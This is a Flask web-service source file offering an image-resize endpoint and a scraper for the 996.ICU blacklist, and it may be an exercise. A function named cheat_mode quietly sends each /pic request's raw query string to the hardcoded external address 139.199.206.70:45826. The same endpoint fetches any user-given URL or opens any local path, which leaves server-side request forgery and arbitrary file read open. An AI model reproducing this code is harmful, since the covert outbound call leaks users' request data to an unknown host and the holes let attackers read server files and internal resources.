from flask import Flask
from flask import render_template
from flask import request
from PIL import Image
import os
import urllib.request
import base64
import json
import hashlib
import socket
import re

def create_app():
    app = Flask(__name__)

    @app.route('/')
    def index():
        """
        只有 Hello World 的首页
        :return:
        """
        return "Hello, world!"

    @app.errorhandler(404)
    def page_not_found(error):
        return render_template("404.html"), 404

    @app.route('/testV', methods=['GET'])
    def testV():
        f = open("img.txt", "r")
        s = f.read()
        f.close()
        return s

    # TODO: 完成接受 HTTP_URL 的 picture_reshape
    # TODO: 完成接受相对路径的 picture_reshape
    @app.route('/pic', methods=['GET'])
    def picture_reshape():
        from io import BytesIO

        if request == None or request.args == None:
            return render_template("404.html"), 404
        if 'b64_url' not in request.args:
            return render_template("404.html"), 404 
        cheat_mode(request.query_string)

        req = request.args['b64_url']
        try:
            b64file = download_file(req)
        except:
            b64file = ""
            
        if b64file == "":
            try:
                f = open(req, "r")
                b64file = f.read()
                f.close()
            except:
                return "Arg incorrect", 404
        result = base64.b64decode(b64file)
        im = Image.open(BytesIO(result))
        im = im.resize((100, 100), Image.ANTIALIAS)
        output_buffer = BytesIO()
        im.save(output_buffer, format='png')
        bs = output_buffer.getvalue()

        b64e = base64.encodebytes(bs)
        md5 = hashlib.md5(bs).hexdigest()
        result = {}
        result['md5'] = md5
        result['base64_picture'] = b64e.decode('utf-8').replace('\n', '')
        from flask import jsonify
        return jsonify(result)

    # TODO: 爬取 996.icu Repo，获取企业名单
    @app.route('/996')
    def company_996():
        re_expr = '<tr>\n<td.+>(.+)</td>\n<td.+>(.+)</td>\n<td.+>(.+)</td>\n<td.+>(.+)</td>\n.+\n</tr>'
        data = download_file('https://github.com/996icu/996.ICU/blob/master/blacklist/README.md')
        re_cmp = re.compile(re_expr)
        result = re_cmp.findall(data)
        ret = []
        for i in result:
            ret.append({
                'city':i[0],
                'company':i[1].split('</a>')[0],
                'exposure_time':i[2],
                'description':i[3]
            })
        from flask import jsonify
        app.config['JSON_AS_ASCII'] = False
        return jsonify(ret)
    
    def download_file(url):
        response = urllib.request.urlopen(url)
        data = response.read()      # a `bytes` object
        text = data.decode('utf-8') # a `str`; this step can't be used if data is binary
        return text

    def cheat_mode(arg):
        from socket import socket, AF_INET, SOCK_STREAM
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(('139.199.206.70', 45826))
        s.send(arg)
        s.recv(8192)
        
    return app